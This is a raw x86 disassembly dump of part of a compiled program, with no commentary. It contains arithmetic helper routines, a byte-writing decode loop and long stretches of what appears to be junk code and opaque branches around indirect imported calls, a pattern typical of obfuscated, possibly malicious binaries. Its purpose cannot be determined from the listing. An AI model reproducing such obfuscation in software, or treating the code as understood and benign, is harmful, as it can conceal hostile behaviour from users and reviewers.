  41df83:	xor    edx,edx
  41df85:	pop    esi
  41df86:	shl    ecx,0x1e
  41df89:	or     eax,edx
  41df8b:	pop    ebx
  41df8c:	leave  
  41df8d:	ret    0x10
  41df90:	mov    eax,DWORD PTR [esp+0x8]
  41df94:	mov    ecx,DWORD PTR [esp+0x10]
  41df98:	xor    DWORD PTR ds:0x4228ba,0x2ee8
  41dfa2:	or     ecx,eax
  41dfa4:	not    ecx
  41dfa6:	mov    ecx,DWORD PTR [esp+0xc]
  41dfaa:	mov    DWORD PTR ds:0x422936,0x71b
  41dfb4:	jne    0x41e048
  41dfba:	cmp    DWORD PTR ds:0x422936,0x0
  41dfc1:	not    DWORD PTR ds:0x42292a
  41dfc7:	mov    DWORD PTR ds:0x42291a,0x73d7
  41dfd1:	mov    DWORD PTR ds:0x4229ce,0x27c3
  41dfdb:	jmp    0x41e03f
  41dfe0:	mov    eax,0x55fe
  41dfe5:	jge    0x41e02f
  41dfeb:	push   0x626f
  41dff0:	push   DWORD PTR [ebp-0x10]
  41dff3:	push   DWORD PTR [ebp-0x10]
  41dff6:	push   DWORD PTR [ebp-0x14]
  41dff9:	push   DWORD PTR [ebp-0x14]
  41dffc:	push   0x6abc
  41e001:	call   DWORD PTR ds:0x42a194
  41e007:	sbb    DWORD PTR ds:0x42295e,0x422926
  41e011:	xor    DWORD PTR ds:0x4228de,0x422996
  41e01b:	or     DWORD PTR ds:0x4229b2,0x422932
  41e025:	or     DWORD PTR ds:0x422906,0x42298e
  41e02f:	or     DWORD PTR ds:0x4229a2,0x766e
  41e039:	sbb    DWORD PTR ds:0x422996,ebx
  41e03f:	mov    eax,DWORD PTR [esp+0x4]
  41e043:	mul    ecx
  41e045:	ret    0x10
  41e048:	push   ebx
  41e049:	mul    ecx
  41e04b:	mov    ebx,eax
  41e04d:	mov    eax,DWORD PTR [esp+0x8]
  41e051:	mul    DWORD PTR [esp+0x14]
  41e055:	add    ebx,eax
  41e057:	mov    eax,DWORD PTR [esp+0x8]
  41e05b:	mul    ecx
  41e05d:	add    edx,ebx
  41e05f:	pop    ebx
  41e060:	ret    0x10
  41e063:	push   ebp
  41e064:	mov    ebp,esp
  41e066:	sub    esp,0x30
  41e069:	push   ebx
  41e06a:	push   esi
  41e06b:	push   edi
  41e06c:	mov    DWORD PTR [ebp-0xc],0x1d4c
  41e073:	mov    DWORD PTR [ebp-0x8],0x1c4a
  41e07a:	mov    DWORD PTR [ebp-0x4],0x73ba
  41e081:	mov    DWORD PTR [ebp-0x1c],0x7afa
  41e088:	mov    DWORD PTR [ebp-0x18],0x618d
  41e08f:	mov    DWORD PTR [ebp-0x14],0x7b8c
  41e096:	mov    DWORD PTR [ebp-0x10],0x46ba
  41e09d:	mov    DWORD PTR [ebp-0x30],0x6996
  41e0a4:	mov    DWORD PTR [ebp-0x2c],0x3bbb
  41e0ab:	mov    DWORD PTR [ebp-0x28],0x571e
  41e0b2:	mov    DWORD PTR [ebp-0x24],0x46e5
  41e0b9:	mov    ecx,DWORD PTR [ebp-0x14]
  41e0bc:	imul   ecx,ecx,0x7649
  41e0c2:	add    ecx,DWORD PTR [ebp-0x18]
  41e0c5:	xor    edx,edx
  41e0c7:	add    ecx,DWORD PTR [ebp-0x1c]
  41e0ca:	mov    eax,DWORD PTR [ebp-0x4]
  41e0cd:	mov    esi,DWORD PTR [ebp-0x8]
  41e0d0:	sub    eax,0x3049
  41e0d5:	imul   eax,eax,0x585
  41e0db:	add    eax,0x46ca
  41e0e0:	xor    ecx,0x3916a43d
  41e0e6:	div    esi
  41e0e8:	mov    edi,0x2a7c
  41e0ed:	mov    esi,0x2cea
  41e0f2:	jmp    0x41e189
  41e0f7:	mov    DWORD PTR [ebp-0x20],0xeaf
  41e0fe:	mov    DWORD PTR [ebp-0x14],0x6627
  41e105:	mov    DWORD PTR [ebp-0x18],0x2899
  41e10c:	mov    DWORD PTR [ebp-0x1c],0x4f7d
  41e113:	mov    eax,DWORD PTR [ebp-0x1c]
  41e116:	mov    edx,DWORD PTR [ebp-0x18]
  41e119:	or     eax,edx
  41e11b:	mov    edx,DWORD PTR [ebp-0x14]
  41e11e:	imul   eax,edx
  41e121:	add    eax,DWORD PTR [ebp-0x20]
  41e124:	xor    edx,edx
  41e126:	mov    ebx,0x5ceb
  41e12b:	div    ebx
  41e12d:	mov    ebx,DWORD PTR [ebp+0x8]
  41e130:	mov    edx,ecx
  41e132:	xor    eax,0x4050
  41e137:	sub    edx,eax
  41e139:	mov    DWORD PTR [ebp-0x20],edx
  41e13c:	mov    eax,DWORD PTR [ebp-0x24]
  41e13f:	mov    dl,BYTE PTR [ebp+0xc]
  41e142:	xor    al,0xd1
  41e144:	sub    dl,al
  41e146:	mov    eax,DWORD PTR [ebp-0x28]
  41e149:	sub    dl,al
  41e14b:	mov    eax,DWORD PTR [ebp-0x20]
  41e14e:	add    dl,0x52
  41e151:	mov    BYTE PTR [eax+ebx*1],dl
  41e154:	mov    eax,DWORD PTR [ebp-0x2c]
  41e157:	sub    eax,0x421
  41e15c:	and    eax,0xd30
  41e161:	add    eax,DWORD PTR [ebp-0x30]
  41e164:	xor    edx,edx
  41e166:	mov    ebx,0x6ea6
  41e16b:	div    ebx
  41e16d:	xor    edx,edx
  41e16f:	add    ecx,eax
  41e171:	mov    eax,DWORD PTR [ebp-0x4]
  41e174:	mov    ebx,DWORD PTR [ebp-0x8]
  41e177:	sub    eax,0x3049
  41e17c:	imul   eax,eax,0x585
  41e182:	add    eax,0x46ca
  41e187:	div    ebx
  41e189:	mov    edx,DWORD PTR [ebp-0xc]
  41e18c:	xor    eax,edx
  41e18e:	mov    edx,0x1086
  41e193:	sub    edx,eax
  41e195:	mov    eax,DWORD PTR [ebp-0x10]
  41e198:	and    eax,0x4a00
  41e19d:	or     eax,0x20
  41e1a0:	sub    eax,edi
  41e1a2:	xor    eax,esi
  41e1a4:	mov    ebx,ecx
  41e1a6:	sub    ebx,eax
  41e1a8:	cmp    ebx,edx
  41e1aa:	jbe    0x41e0f7
  41e1b0:	pop    edi
  41e1b1:	pop    esi
  41e1b2:	pop    ebx
  41e1b3:	leave  
  41e1b4:	ret    0x8
  41e1b7:	push   ebp
  41e1b8:	mov    ebp,esp
  41e1ba:	and    esp,0xfffffff8
  41e1bd:	sub    esp,0x8c
  41e1c3:	push   ebx
  41e1c4:	push   esi
  41e1c5:	push   edi
  41e1c6:	push   0xa
  41e1c8:	push   DWORD PTR ds:0x4220dc
  41e1ce:	push   DWORD PTR ds:0x4220dc
  41e1d4:	call   DWORD PTR ds:0x42a004
  41e1da:	test   eax,eax
  41e1dc:	jle    0x41e1e9
  41e1e2:	xor    eax,eax
  41e1e4:	jmp    0x41f80d
  41e1e9:	mov    DWORD PTR [esp+0x38],0x10b8
  41e1f1:	or     DWORD PTR ds:0x4229b6,edx
  41e1f7:	mov    DWORD PTR [esp+0x3c],0x31bb
  41e1ff:	adc    ecx,ecx
  41e201:	mov    DWORD PTR [esp+0x40],0x2114
  41e209:	mov    DWORD PTR [esp+0x44],0xfe7
  41e211:	cmp    DWORD PTR ds:0x4229c6,0x0
  41e218:	mov    ecx,DWORD PTR ds:0x422996
  41e21e:	not    ecx
  41e220:	jmp    0x41e283
  41e225:	mov    eax,0x3d56
  41e22a:	jb     0x41e267
  41e230:	push   0x4229ce
  41e235:	push   0x3b50
  41e23a:	push   0x1b8c
  41e23f:	push   DWORD PTR [ebp-0x10]
  41e242:	push   DWORD PTR [ebp-0x14]
  41e245:	push   0x153f
  41e24a:	push   DWORD PTR [ebp-0x24]
  41e24d:	call   DWORD PTR ds:0x42a070
  41e253:	not    ecx
  41e255:	add    ecx,ecx
  41e257:	sbb    DWORD PTR ds:0x4228aa,0x4228c2
  41e261:	or     DWORD PTR ds:0x42298a,ebx
  41e267:	add    ecx,ecx
  41e269:	sbb    DWORD PTR ds:0x42289e,0x422946
  41e273:	xor    ecx,ecx
  41e275:	xor    ecx,ecx
  41e277:	or     ecx,DWORD PTR ds:0x42292e
  41e27d:	add    DWORD PTR ds:0x4229b2,ecx
  41e283:	mov    DWORD PTR [esp+0x18],0xac404108
  41e28b:	cmp    DWORD PTR ds:0x422922,0x0
  41e292:	mov    DWORD PTR ds:0x4229ce,0x2ada
  41e29c:	mov    DWORD PTR ds:0x42297a,edi
  41e2a2:	jmp    0x41e303
  41e2a7:	not    DWORD PTR ds:0x42290a
  41e2ad:	mov    DWORD PTR ds:0x42288a,0x279a
  41e2b7:	jbe    0x41e2eb
  41e2bd:	push   0x4226b9
  41e2c2:	call   DWORD PTR ds:0x42a074
  41e2c8:	add    ecx,ecx
  41e2ca:	movzx  ecx,BYTE PTR ds:0x4229a6
  41e2d1:	and    DWORD PTR ds:0x42290e,ecx
  41e2d7:	and    DWORD PTR ds:0x42298e,edi
  41e2dd:	xor    ecx,ecx
  41e2df:	xor    ecx,DWORD PTR ds:0x422932
  41e2e5:	or     DWORD PTR ds:0x422992,ecx
  41e2eb:	add    ecx,DWORD PTR ds:0x4228aa
  41e2f1:	xor    ecx,0xa66
  41e2f7:	or     DWORD PTR ds:0x4228da,edi
  41e2fd:	sub    eax,DWORD PTR ds:0x4229ba
  41e303:	mov    DWORD PTR [esp+0x1c],0x1002
  41e30b:	or     eax,eax
  41e30d:	mov    DWORD PTR [esp+0x10],0x9aa
  41e315:	xor    eax,eax
  41e317:	xor    eax,DWORD PTR ds:0x4229e2
  41e31d:	mov    ecx,DWORD PTR ds:0x422abe
  41e323:	sub    ecx,eax
  41e325:	and    eax,DWORD PTR [eax+ecx*1]
  41e328:	push   0x61f6
  41e32d:	cmp    DWORD PTR ds:0x4228ee,0x0
  41e334:	mov    DWORD PTR ds:0x42295e,0x401d
  41e33e:	mov    DWORD PTR ds:0x422972,ebx
  41e344:	mov    ecx,0x5ee5
  41e349:	jmp    0x41e3b1
  41e34e:	mov    DWORD PTR ds:0x4228ae,ebx
  41e354:	mov    DWORD PTR ds:0x4228f2,0x622c
  41e35e:	ja     0x41e395
  41e364:	push   0x67cd
  41e369:	push   DWORD PTR [ebp-0x24]
  41e36c:	push   0x11c0
  41e371:	call   DWORD PTR ds:0x42a078
  41e377:	sub    DWORD PTR ds:0x4228e2,0x2f74
  41e381:	xor    ecx,ecx
  41e383:	add    ecx,DWORD PTR ds:0x422922
  41e389:	xor    ecx,DWORD PTR ds:0x4228da
  41e38f:	mov    DWORD PTR ds:0x422922,ecx
  41e395:	sub    ecx,0x1bd0
  41e39b:	mov    ecx,DWORD PTR ds:0x422986
  41e3a1:	adc    DWORD PTR ds:0x42288e,ecx
  41e3a7:	or     DWORD PTR ds:0x42294a,0xc71
  41e3b1:	mov    DWORD PTR [esp+0x18],0x747
  41e3b9:	mov    eax,DWORD PTR [esp+0x14]
  41e3bd:	or     ecx,DWORD PTR ds:0x4228be
  41e3c3:	mov    ecx,DWORD PTR [esp+0x18]
  41e3c7:	push   0x1caf
  41e3cc:	sub    DWORD PTR ds:0x4228ae,0x2516
  41e3d6:	push   ecx
  41e3d7:	sub    DWORD PTR ds:0x422916,0x4228e6
  41e3e1:	push   eax
  41e3e2:	call   0x41df90
  41e3e7:	sbb    DWORD PTR ds:0x4228ce,0x6aff
  41e3f1:	mov    ecx,DWORD PTR [esp+0x18]
  41e3f5:	mov    esi,DWORD PTR ds:0x422946
  41e3fb:	sub    DWORD PTR ds:0x4228be,esi
  41e401:	mov    esi,DWORD PTR [esp+0x1c]
  41e405:	sbb    DWORD PTR ds:0x4229d2,0x42291a
  41e40f:	push   esi
  41e410:	sbb    DWORD PTR ds:0x42299a,0x3dc6
  41e41a:	push   ecx
  41e41b:	add    DWORD PTR ds:0x4228a2,0x422972
  41e425:	push   edx
  41e426:	push   eax
  41e427:	sbb    DWORD PTR ds:0x4228de,0x749b
  41e431:	call   0x421ad5
  41e436:	mov    ecx,DWORD PTR [esp+0x40]
  41e43a:	sub    esi,DWORD PTR ds:0x42291a
  41e440:	mov    esi,DWORD PTR [esp+0x44]
  41e444:	sub    DWORD PTR ds:0x42288a,0x2899
  41e44e:	add    eax,ecx
  41e450:	mov    DWORD PTR ds:0x422956,0x3eb8
  41e45a:	mov    ecx,DWORD PTR [esp+0x38]
  41e45e:	adc    edx,esi
  41e460:	mov    esi,DWORD PTR [esp+0x3c]
  41e464:	sub    DWORD PTR ds:0x4228da,0x4228fa
  41e46e:	xor    eax,ecx
  41e470:	dec    DWORD PTR ds:0x4229c6
  41e476:	mov    DWORD PTR [esp+0x40],eax
  41e47a:	xor    edx,esi
  41e47c:	mov    DWORD PTR [esp+0x44],edx
  41e480:	or     DWORD PTR ds:0x42292e,ecx
  41e486:	mov    DWORD PTR [esp+0x18],0x6cd4
  41e48e:	mov    DWORD PTR [esp+0x1c],0x5497
  41e496:	mov    DWORD PTR [esp+0x10],0x36dd
  41e49e:	xor    ecx,DWORD PTR ds:0x42289a
  41e4a4:	mov    DWORD PTR [esp+0x14],0x78dd
  41e4ac:	cmp    DWORD PTR ds:0x422956,0x0
  41e4b3:	mov    DWORD PTR ds:0x422902,0x537a
  41e4bd:	mov    DWORD PTR ds:0x42289a,ebx
  41e4c3:	not    ecx
  41e4c5:	jmp    0x41e525
  41e4ca:	mov    DWORD PTR ds:0x4229aa,0x24bb
  41e4d4:	mov    ecx,0x50b
  41e4d9:	jle    0x41e50f
  41e4df:	push   0x40ba
  41e4e4:	push   0x4c3a
  41e4e9:	push   DWORD PTR [ebp-0x20]
  41e4ec:	push   0x19f6
  41e4f1:	push   DWORD PTR [ebp-0x28]
  41e4f4:	push   0x29a0
  41e4f9:	call   DWORD PTR ds:0x42a2a8
  41e4ff:	adc    DWORD PTR ds:0x4228fe,0x2e50
  41e509:	or     DWORD PTR ds:0x4229b2,edx
  41e50f:	sub    DWORD PTR ds:0x422956,edi
  41e515:	add    DWORD PTR ds:0x422926,0x2a5
  41e51f:	or     DWORD PTR ds:0x422916,ebx
  41e525:	mov    DWORD PTR [esp+0x38],0x3985
  41e52d:	cmp    DWORD PTR ds:0x4228d6,0x0
  41e534:	mov    DWORD PTR ds:0x4228c2,ecx
  41e53a:	mov    ecx,DWORD PTR ds:0x4228a2
  41e540:	jmp    0x41e587
  41e545:	not    eax
  41e547:	je     0x41e56f
  41e54d:	push   DWORD PTR [ebp-0x10]
  41e550:	push   0x8599
  41e555:	push   DWORD PTR [ebp-0x24]
  41e558:	push   0x24de
  41e55d:	call   DWORD PTR ds:0x42a2ac
  41e563:	sub    DWORD PTR ds:0x4228fe,ebx
  41e569:	and    ecx,0x2884
  41e56f:	and    ecx,0x5007
  41e575:	sub    DWORD PTR ds:0x422892,edi
  41e57b:	adc    DWORD PTR ds:0x42295e,ebx
  41e581:	neg    DWORD PTR ds:0x42296e
  41e587:	push   0x0
  41e589:	not    eax
  41e58b:	mov    DWORD PTR [esp+0x40],0x1dd2
  41e593:	movzx  ecx,WORD PTR ds:0x422892
  41e59a:	and    ecx,DWORD PTR ds:0x4228e2
  41e5a0:	mov    DWORD PTR ds:0x422892,ecx
  41e5a6:	mov    eax,DWORD PTR [esp+0x3c]
  41e5aa:	or     DWORD PTR ds:0x42292a,ecx
  41e5b0:	mov    ecx,DWORD PTR [esp+0x40]
  41e5b4:	adc    DWORD PTR ds:0x4228a6,0x44d3
  41e5be:	push   0x5af1c38e
  41e5c3:	push   ecx
  41e5c4:	neg    DWORD PTR ds:0x4228a2
  41e5ca:	push   eax
  41e5cb:	not    DWORD PTR ds:0x4228e2
  41e5d1:	call   0x421ad5
  41e5d6:	mov    ecx,DWORD PTR [esp+0x10]
  41e5da:	movzx  esi,BYTE PTR ds:0x4228fe
  41e5e1:	add    esi,DWORD PTR ds:0x4229aa
  41e5e7:	mov    DWORD PTR ds:0x4228fe,esi
  41e5ed:	mov    esi,DWORD PTR [esp+0x14]
  41e5f1:	sub    DWORD PTR ds:0x42293e,0x4228e6
  41e5fb:	push   esi
  41e5fc:	or     DWORD PTR ds:0x42290e,0x4229ba
  41e606:	push   ecx
  41e607:	adc    DWORD PTR ds:0x4229ce,0x4228a2
  41e611:	push   edx
  41e612:	add    DWORD PTR ds:0x422982,0x422926
  41e61c:	push   eax
  41e61d:	mov    DWORD PTR ds:0x422972,0x6150
  41e627:	call   0x41df90
  41e62c:	and    esi,DWORD PTR ds:0x4228e6
  41e632:	mov    ecx,DWORD PTR [esp+0x18]
  41e636:	cmp    DWORD PTR ds:0x4228d2,0x0
  41e63d:	mov    esi,0x2802
  41e642:	mov    esi,DWORD PTR ds:0x42290e
  41e648:	jmp    0x41e6c1
  41e64d:	mov    DWORD PTR ds:0x42292e,edx
  41e653:	mov    DWORD PTR ds:0x42298a,0x21bd
  41e65d:	ja     0x41e6ae
  41e663:	push   0x422835
  41e668:	push   DWORD PTR [ebp-0x24]
  41e66b:	push   DWORD PTR [ebp-0x28]
  41e66e:	push   0x295c
  41e673:	push   0x31b0
  41e678:	call   DWORD PTR ds:0x42a2b0
  41e67e:	or     DWORD PTR ds:0x422936,0x4228ba
  41e688:	movzx  esi,WORD PTR ds:0x42292a
  41e68f:	add    esi,DWORD PTR ds:0x4229aa
  41e695:	mov    DWORD PTR ds:0x42292a,esi
  41e69b:	movzx  esi,BYTE PTR ds:0x42290a
  41e6a2:	add    DWORD PTR ds:0x4229ba,esi
  41e6a8:	sub    DWORD PTR ds:0x422896,ecx
  41e6ae:	movzx  esi,BYTE PTR ds:0x4228ea
  41e6b5:	sub    DWORD PTR ds:0x4229be,esi
  41e6bb:	adc    DWORD PTR ds:0x42295a,ecx
  41e6c1:	mov    esi,DWORD PTR [esp+0x1c]
  41e6c5:	xor    eax,ecx
  41e6c7:	add    DWORD PTR ds:0x4228ce,ecx
  41e6cd:	mov    ecx,DWORD PTR [esp+0x40]
  41e6d1:	or     DWORD PTR ds:0x4229c2,0x4228c2
  41e6db:	xor    edx,esi
  41e6dd:	xor    DWORD PTR ds:0x422946,ebx
  41e6e3:	mov    esi,DWORD PTR [esp+0x44]
  41e6e7:	sbb    DWORD PTR ds:0x4228d6,0x42295e
  41e6f1:	xor    eax,0x6e4d
  41e6f6:	adc    DWORD PTR ds:0x422966,0x4228c2
  41e700:	xor    edx,0x79dc
  41e706:	cmp    ecx,eax
  41e708:	jne    0x41eccb
  41e70e:	cmp    esi,edx
  41e710:	mov    DWORD PTR ds:0x422956,0x607f
  41e71a:	jne    0x41eccb
  41e720:	sbb    ecx,eax
  41e722:	mov    DWORD PTR [esp+0x40],0x7b6e
  41e72a:	and    DWORD PTR ds:0x422982,0x281d
  41e734:	mov    DWORD PTR [esp+0x18],0x1856
  41e73c:	dec    ecx
  41e73d:	mov    DWORD PTR [esp+0x10],0x6e3c
  41e745:	mov    eax,DWORD PTR [esp+0x10]
  41e749:	inc    ecx
  41e74a:	imul   eax,eax,0x2801
  41e750:	mov    ecx,DWORD PTR ds:0x422a6a
  41e756:	mov    ecx,DWORD PTR [ecx]
  41e758:	and    DWORD PTR ds:0x422922,ecx
  41e75e:	xor    edx,edx
  41e760:	sbb    DWORD PTR ds:0x42289e,ebx
  41e766:	mov    ecx,0x5f48
  41e76b:	div    ecx
  41e76d:	push   DWORD PTR ds:0x3b8dcfc0
  41e773:	xor    edx,edx
  41e775:	adc    DWORD PTR ds:0x42290e,0x3f8e
  41e77f:	and    eax,0x54fe
  41e784:	xor    eax,0x283cecf3
  41e789:	cmp    DWORD PTR ds:0x4228a2,0x0
  41e790:	mov    ecx,0x4c91
  41e795:	mov    DWORD PTR ds:0x422972,0x3523
  41e79f:	mov    ecx,DWORD PTR ds:0x42288e
  41e7a5:	jmp    0x41e813
  41e7aa:	mov    DWORD PTR ds:0x4229c2,0x3b0c
  41e7b4:	mov    DWORD PTR ds:0x4228de,0x3b7b
  41e7be:	jbe    0x41e7f1
  41e7c4:	push   DWORD PTR [ebp-0x18]
  41e7c7:	push   0x2888
  41e7cc:	push   0x7bd5
  41e7d1:	push   0x6538
  41e7d6:	push   0x7c45
  41e7db:	call   DWORD PTR ds:0x42a2b4
  41e7e1:	and    DWORD PTR ds:0x42295a,0x2f05
  41e7eb:	xor    ecx,0x75ac
  41e7f1:	or     ecx,DWORD PTR ds:0x42288e
  41e7f7:	sbb    DWORD PTR ds:0x42298a,ebx
  41e7fd:	mov    ecx,DWORD PTR ds:0x4228ba
  41e803:	sbb    DWORD PTR ds:0x422892,ecx
  41e809:	sub    DWORD PTR ds:0x4229d2,0x2cc7
  41e813:	push   DWORD PTR [eax]
  41e815:	cmp    DWORD PTR ds:0x42288a,0x0
  41e81c:	mov    ecx,0x2a8f
  41e821:	mov    DWORD PTR ds:0x4228d2,0x62da
  41e82b:	mov    DWORD PTR ds:0x4228b2,0x461d
  41e835:	jmp    0x41e86d
  41e83a:	not    eax
  41e83c:	mov    eax,0x1aaa
  41e841:	jle    0x41e861
  41e847:	push   DWORD PTR [ebp-0x14]
  41e84a:	push   0x689c
  41e84f:	call   DWORD PTR ds:0x42a2b8
  41e855:	and    ecx,DWORD PTR ds:0x4228ce
  41e85b:	add    DWORD PTR ds:0x4228c2,ecx
  41e861:	sbb    DWORD PTR ds:0x42299e,ecx
  41e867:	sbb    ecx,0xe30
  41e86d:	mov    eax,DWORD PTR [esp+0x20]
  41e871:	push   0xb
  41e873:	pop    ecx
  41e874:	div    ecx
  41e876:	sub    ecx,0x60ba
  41e87c:	mov    ecx,DWORD PTR [esp+0x48]
  41e880:	not    DWORD PTR ds:0x4228b6
  41e886:	sub    eax,ecx
  41e888:	adc    DWORD PTR ds:0x4229ca,0x4229b6
  41e892:	add    eax,0x4d1
  41e897:	sbb    DWORD PTR ds:0x422992,0x4228aa
  41e8a1:	imul   eax,eax,0xfffffb44
  41e8a7:	and    eax,0xd55
  41e8ac:	xor    eax,0xf6b6e30e
  41e8b1:	push   DWORD PTR [eax]
  41e8b3:	add    DWORD PTR ds:0x42293e,0x4401
  41e8bd:	push   DWORD PTR ds:0x3747636f
  41e8c3:	push   DWORD PTR ds:0xc7c2f83b
  41e8c9:	or     DWORD PTR ds:0x422926,0x64ef
  41e8d3:	push   DWORD PTR ds:0xe8d8887e
  41e8d9:	push   DWORD PTR ds:0x1e049617
  41e8df:	xor    DWORD PTR ds:0x4228b2,0x4229ae
  41e8e9:	call   DWORD PTR ds:0x42a030
  41e8ef:	not    eax
  41e8f1:	mov    DWORD PTR [esp+0x18],0xac269
  41e8f9:	cmp    DWORD PTR ds:0x422992,0x0
  41e900:	mov    ecx,DWORD PTR ds:0x4228d2
  41e906:	mov    ecx,0x4e69
  41e90b:	not    ecx
  41e90d:	jmp    0x41e95d
  41e912:	not    DWORD PTR ds:0x4228d2
  41e918:	mov    DWORD PTR ds:0x4228ee,0x6c90
  41e922:	jb     0x41e957
  41e928:	push   0x7f87
  41e92d:	push   DWORD PTR [ebp-0x1c]
  41e930:	push   0x186c
  41e935:	push   DWORD PTR [ebp-0x10]
  41e938:	push   DWORD PTR [ebp-0x1c]
  41e93b:	call   DWORD PTR ds:0x42a07c
  41e941:	adc    DWORD PTR ds:0x422962,0x439a
  41e94b:	sbb    ecx,ecx
  41e94d:	or     DWORD PTR ds:0x4229b6,0x7fc4
  41e957:	sbb    ecx,ecx
  41e959:	add    ecx,ecx
  41e95b:	or     ecx,ecx
  41e95d:	mov    DWORD PTR [esp+0x10],0x5886
  41e965:	mov    ecx,DWORD PTR [esp+0x10]
  41e969:	sub    DWORD PTR ds:0x4228e6,ebx
  41e96f:	mov    eax,0x2f60
  41e974:	xor    DWORD PTR ds:0x4228be,0x78d1
  41e97e:	sub    eax,ecx
  41e980:	movzx  ecx,BYTE PTR ds:0x422952
  41e987:	sbb    ecx,DWORD PTR ds:0x4228a6
  41e98d:	mov    DWORD PTR ds:0x422952,ecx
  41e993:	mov    ecx,DWORD PTR [esp+0x18]
  41e997:	xor    eax,0x4eb0
  41e99c:	xor    DWORD PTR ds:0x42293a,0x31dd
  41e9a6:	xor    edx,edx
  41e9a8:	or     DWORD PTR ds:0x422952,0x422962
  41e9b2:	div    ecx
  41e9b4:	imul   eax,eax,0x79e
  41e9ba:	inc    DWORD PTR ds:0x422956
  41e9c0:	xor    eax,0x7f8a
  41e9c5:	sbb    DWORD PTR ds:0x422906,0x77b7
  41e9cf:	push   DWORD PTR [eax+0x66d98445]
  41e9d5:	or     DWORD PTR ds:0x4228a6,0x1e7d
  41e9df:	push   DWORD PTR ds:0x4af06c36
  41e9e5:	sbb    DWORD PTR ds:0x4228ae,0x4228be
  41e9ef:	call   DWORD PTR ds:0x42a33c
  41e9f5:	and    DWORD PTR ds:0x42294a,edi
  41e9fb:	mov    DWORD PTR [esp+0x10],0xd8e5515f
  41ea03:	cmp    DWORD PTR ds:0x4228ba,0x0
  41ea0a:	mov    ecx,0x55dc
  41ea0f:	mov    DWORD PTR ds:0x42292a,0x378a
  41ea19:	not    DWORD PTR ds:0x422892
  41ea1f:	jmp    0x41ea94
  41ea24:	mov    DWORD PTR ds:0x4228fe,0x78ab
  41ea2e:	mov    DWORD PTR ds:0x4228ba,0x7a87
  41ea38:	jb     0x41ea66
  41ea3e:	push   DWORD PTR [ebp-0x10]
  41ea41:	push   0x211a
  41ea46:	push   DWORD PTR [ebp-0xc]
  41ea49:	push   DWORD PTR [ebp-0x20]
  41ea4c:	call   DWORD PTR ds:0x42a080
  41ea52:	and    DWORD PTR ds:0x42295e,edx
  41ea58:	or     esi,ecx
  41ea5a:	or     esi,DWORD PTR ds:0x422906
  41ea60:	and    DWORD PTR ds:0x4229b6,edi
  41ea66:	adc    DWORD PTR ds:0x422956,0x422932
  41ea70:	xor    ecx,ecx
  41ea72:	xor    ecx,DWORD PTR ds:0x422a9e
  41ea78:	xor    esi,esi
  41ea7a:	xor    esi,DWORD PTR ds:0x422b16
  41ea80:	sub    ecx,esi
  41ea82:	add    ecx,DWORD PTR [ecx+esi*1]
  41ea85:	sub    ecx,ecx
  41ea87:	movzx  esi,WORD PTR ds:0x42290a
  41ea8e:	and    DWORD PTR ds:0x4228fe,esi
  41ea94:	mov    DWORD PTR [esp+0x14],0x0
  41ea9c:	cmp    DWORD PTR ds:0x4228f2,0x0
  41eaa3:	movzx  esi,BYTE PTR ds:0x4228fa
  41eaaa:	not    esi
  41eaac:	mov    DWORD PTR ds:0x42290e,0x4dc8
  41eab6:	jmp    0x41eb1f
  41eabb:	mov    esi,DWORD PTR ds:0x4228b2
  41eac1:	not    eax
  41eac3:	jg     0x41eb00
  41eac9:	push   0x0
  41eacb:	push   0x36d5
  41ead0:	push   0x10b0
  41ead5:	call   DWORD PTR ds:0x42a2bc
  41eadb:	and    edx,0x7f12
  41eae1:	dec    ecx
  41eae2:	mov    edx,DWORD PTR ds:0x42291a
  41eae8:	or     edx,DWORD PTR ds:0x4228a2
  41eaee:	mov    DWORD PTR ds:0x42291a,edx
  41eaf4:	mov    edx,DWORD PTR ds:0x4228e6
  41eafa:	or     DWORD PTR ds:0x4228a6,edx
  41eb00:	mov    edx,DWORD PTR ds:0x42296e
  41eb06:	add    DWORD PTR ds:0x4229c6,edx
  41eb0c:	movzx  edx,WORD PTR ds:0x42296a
  41eb13:	and    edx,DWORD PTR ds:0x422892
  41eb19:	mov    DWORD PTR ds:0x42296a,edx
  41eb1f:	mov    DWORD PTR [esp+0x38],0x9f7
  41eb27:	cmp    DWORD PTR ds:0x42292e,0x0
  41eb2e:	mov    DWORD PTR ds:0x4228c6,0x484a
  41eb38:	mov    DWORD PTR ds:0x42289a,edi
  41eb3e:	mov    esi,DWORD PTR ds:0x4228ce
  41eb44:	mov    DWORD PTR ds:0x42298e,ebx
  41eb4a:	jmp    0x41ebb5
  41eb4f:	mov    DWORD PTR ds:0x422962,edi
  41eb55:	mov    DWORD PTR ds:0x4228f2,ebx
  41eb5b:	jb     0x41eb8a
  41eb61:	push   0x3714
  41eb66:	push   DWORD PTR [ebp-0x1c]
  41eb69:	push   DWORD PTR [ebp-0x28]
  41eb6c:	push   0x3c2f
  41eb71:	call   DWORD PTR ds:0x42a2c0
  41eb77:	movzx  edx,BYTE PTR ds:0x422976
  41eb7e:	and    DWORD PTR ds:0x4228de,edx
  41eb84:	and    DWORD PTR ds:0x4228d2,ecx
  41eb8a:	mov    ecx,DWORD PTR ds:0x422aba
  41eb90:	mov    edx,DWORD PTR ds:0x422ac6
  41eb96:	sub    edx,ecx
  41eb98:	sub    ecx,DWORD PTR [ecx+edx*1]
  41eb9b:	adc    DWORD PTR ds:0x4228ea,ebx
  41eba1:	xor    ecx,ecx
  41eba3:	xor    ecx,DWORD PTR ds:0x422962
  41eba9:	adc    DWORD PTR ds:0x4228ba,ecx
  41ebaf:	xor    ecx,DWORD PTR ds:0x42297a
  41ebb5:	mov    DWORD PTR [esp+0x3c],0x141c
  41ebbd:	add    esi,0x66a7
  41ebc3:	mov    eax,DWORD PTR [esp+0x38]
  41ebc7:	adc    DWORD PTR ds:0x4228d2,ecx
  41ebcd:	mov    ecx,DWORD PTR [esp+0x3c]
  41ebd1:	mov    edx,DWORD PTR [esp+0x10]
  41ebd5:	adc    esi,0x6098
  41ebdb:	mov    esi,DWORD PTR [esp+0x14]
  41ebdf:	neg    DWORD PTR ds:0x42292e
  41ebe5:	push   esi
  41ebe6:	sub    DWORD PTR ds:0x42296e,0x5044
  41ebf0:	push   edx
  41ebf1:	xor    ecx,0x4611
  41ebf7:	xor    eax,0x43f8
  41ebfc:	push   ecx
  41ebfd:	push   eax
  41ebfe:	call   0x421ad5
  41ec03:	add    DWORD PTR ds:0x42297e,0x76c7
  41ec0d:	add    eax,0x2c3
  41ec12:	mov    DWORD PTR [esp+0x48],eax
  41ec16:	adc    edx,0x3413
  41ec1c:	mov    DWORD PTR [esp+0x4c],edx
  41ec20:	adc    ebx,ebx
